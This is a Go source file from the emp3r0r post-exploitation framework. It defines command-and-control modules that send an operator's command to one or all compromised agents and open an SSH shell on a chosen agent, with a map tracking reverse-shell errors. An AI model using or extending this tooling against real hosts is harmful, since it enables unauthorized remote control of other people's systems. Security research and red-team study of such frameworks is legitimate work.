package modules

import (
	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// RShellStatus stores errors from reverseBash
var RShellStatus = make(map[string]error)

// moduleCmd exec cmd on target
func moduleCmd() {
	// send command
	execOnTarget := func(target *emp3r0r_def.Emp3r0rAgent) {
		if def.AgentControlMap[target].Conn == nil {
			logging.Errorf("moduleCmd: agent %s is not connected", target.Tag)
			return
		}
		cmdOpt, ok := def.AvailableModuleOptions["cmd_to_exec"]
		if !ok {
			logging.Errorf("Option 'cmd_to_exec' not found")
			return
		}
		err := agent_util.SendCmd(cmdOpt.Val, "", target)
		if err != nil {
			logging.Errorf("moduleCmd: %v", err)
		}
	}

	// find target
	target := def.ActiveAgent
	if target == nil {
		logging.Warningf("emp3r0r will execute `%s` on all targets this time", def.AvailableModuleOptions["cmd_to_exec"].Val)
		for per_target := range def.AgentControlMap {
			execOnTarget(per_target)
		}
		return
	}

	// write to given target's connection
	if def.AgentControlMap[target] == nil {
		logging.Errorf("moduleCmd: agent control interface not found")
		return
	}
	execOnTarget(target)
}

// moduleShell set up an ssh session
func moduleShell() {
	// find target
	target := def.ActiveAgent
	if target == nil {
		logging.Errorf("Module shell: target does not exist")
		return
	}

	// write to given target's connection
	tControl := def.AgentControlMap[target]
	if tControl == nil {
		logging.Errorf("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		logging.Errorf("moduleShell: agent is not connected")
		return
	}

	// options
	shellOpt, ok := def.AvailableModuleOptions["shell"]
	if !ok {
		logging.Errorf("Option 'shell' not found")
		return
	}
	shell := shellOpt.Val

	argsOpt, ok := def.AvailableModuleOptions["args"]
	if !ok {
		logging.Errorf("Option 'args' not found")
		return
	}
	args := argsOpt.Val

	portOpt, ok := def.AvailableModuleOptions["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	port := portOpt.Val

	// run
	err := SSHClient(shell, args, port, false)
	if err != nil {
		logging.Errorf("moduleShell: %v", err)
	}
}
